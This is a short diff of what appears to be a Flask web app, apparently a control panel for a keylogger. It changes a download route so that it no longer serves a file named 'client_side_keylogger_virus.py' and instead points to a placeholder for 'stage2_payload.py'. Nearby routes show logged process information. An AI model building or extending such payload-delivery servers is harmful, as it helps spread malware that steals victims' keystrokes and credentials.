@@ -53,7 +53,7 @@ def funk6():
          return render_template("log.html", data = data, processinfo = newlist1, lastupdated = prcsinfo[2])
 @app.route("/dwfile")
 def funkdw():
-    path = '/home/ubuntu/downloads/client_side_keylogger_virus.py'
+    path = 'Path to stage2_payload.py'
     return send_file(path, as_attachment=True)
 @app.route("/index", methods = ["GET"])
 @login_required
